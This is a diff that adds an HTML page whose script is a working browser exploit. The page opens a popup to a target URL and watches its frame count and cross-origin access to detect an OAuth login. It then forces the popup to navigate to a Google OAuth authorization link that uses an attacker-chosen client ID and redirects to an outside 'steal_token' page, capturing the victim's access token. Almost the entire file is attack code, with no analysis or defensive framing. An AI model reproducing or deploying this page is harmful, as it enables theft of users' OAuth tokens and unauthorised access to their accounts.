@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f2f2f2;
+        }
+        img {
+            width: 400px;
+            height: 500px;
+            object-fit: contain;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+
+   <script>
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    let foo;
+    let initialFrames = 0;
+    var urlParam = getParameterByName('url');
+    let attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=770783877544-3p0nfvbebbmh2h1r50vuighb1n8e34lu.apps.googleusercontent.com&redirect_uri=https://coop-exploit.vercel.app/steal_token.html&response_type=token&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile";
+    let oauthDetected = false;
+    let redirectAttempted = false;
+
+    function init() {
+        try {
+            initialFrames = foo.frames.length;
+            console.log("Initial Frame Count: " + initialFrames);
+            monitorFrames();
+            monitorWindowChanges();
+        } catch (e) {
+            console.log("Error accessing frame count.");
+            monitorWindowChanges();
+        }
+    }
+
+    function monitorFrames() {
+        if (!foo || foo.closed || redirectAttempted) {
+            console.log("Login window closed or redirect attempted, stopping attack.");
+            return;
+        }
+
+        try {
+            let currentFrames = foo.frames.length;
+            console.log("Current frames: " + currentFrames);
+
+            // Try different frame count thresholds
+            if (currentFrames == 2 && !oauthDetected) {
+                oauthDetected = true;
+                console.log("OAuth threshold reached! Starting advanced monitoring...");
+            }
+        } catch (e) {
+            console.log("Cross-origin frame monitoring...");
+            // Cross-origin might indicate navigation to OAuth
+            if (oauthDetected && !redirectAttempted) {
+                attemptRedirect("Cross-origin detected after OAuth threshold");
+            }
+        }
+
+        setTimeout(monitorFrames, 500);
+    }
+
+    function monitorWindowChanges() {
+        if (!foo || foo.closed || redirectAttempted) return;
+
+        try {
+            // Try to access window properties
+            let windowName = foo.name;
+            let windowLength = foo.length;
+            console.log(`Window accessible: name=${windowName}, length=${windowLength}`);
+            
+        } catch (e) {
+            console.log("Window property access blocked:", e.message);
+            
+            // If we previously detected OAuth and now can't access window properties
+            if (oauthDetected && !redirectAttempted) {
+                attemptRedirect("Window access blocked after OAuth detection");
+            }
+        }
+
+        setTimeout(monitorWindowChanges, 300);
+    }
+
+    function attemptRedirect(reason) {
+        if (redirectAttempted) return;
+        redirectAttempted = true;
+        
+        console.log(`Attempting redirect due to: ${reason}`);
+        
+        // Try multiple redirect methods
+        setTimeout(() => {
+            try {
+                console.log("Method 1: location.replace");
+                foo.location.replace(attackOAuthURL);
+            } catch (e1) {
+                console.log("Method 1 failed:", e1.message);
+                try {
+                    console.log("Method 2: location.href");
+                    foo.location.href = attackOAuthURL;
+                } catch (e2) {
+                    console.log("Method 2 failed:", e2.message);
+                    try {
+                        console.log("Method 3: location assignment");
+                        foo.location = attackOAuthURL;
+                    } catch (e3) {
+                        console.log("All redirect methods failed:", e3.message);
+                        // Try postMessage as last resort
+                        try {
+                            foo.postMessage({redirect: attackOAuthURL}, '*');
+                            console.log("Attempted postMessage redirect");
+                        } catch (e4) {
+                            console.log("PostMessage also failed:", e4.message);
+                        }
+                    }
+                }
+            }
+        }, 100);
+    }
+
+    function launch() {
+        foo = window.open(urlParam, "foo", "width=500,height=600");
+        setTimeout(init, 2000);
+    }
+
+    window.onload = launch;
+</script>
+
+</head>
+<body>
+    <script src="/main.js"></script>
+    <img src="x">
+    </br>
+    <button onclick="launch()">Exploit</button>
+</body>
+</html>
